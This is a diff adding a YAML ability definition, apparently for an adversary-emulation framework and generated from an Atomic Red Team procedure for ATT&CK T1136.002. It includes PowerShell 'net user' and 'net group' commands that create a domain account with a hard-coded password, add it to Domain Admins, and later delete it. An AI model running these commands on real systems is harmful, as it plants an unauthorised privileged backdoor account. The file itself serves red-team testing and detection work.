@@ -1,0 +1,18 @@
+- id: a9c9ba42-0627-40dc-a549-ca0a4e2ad004
+  name: Create a new Windows domain admin user (Generated from Atomic Red Team)
+  description: |
+    Ability for Create Account: Domain Account (ATT&CK T1136.002). 
+    Creates a new domain admin user. Requires agent to be running as a domain admin.
+    Generated from Atomic Red Team procedures (fcec2963-9951-4173-9bfa-98d8b7834e62); review and test safely before use.
+  tactic: persistence
+  technique:
+    attack_id: T1136.002
+    name: 'Create Account: Domain Account'
+  platforms:
+    windows:
+      psh:
+        command: |
+          net user "T1136002Admin" "T1136_pass123!" /add /domain;
+          net group "Domain Admins" "T1136002Admin" /add /domain
+        cleanup: |
+          net user "T1136002Admin" /del /domain
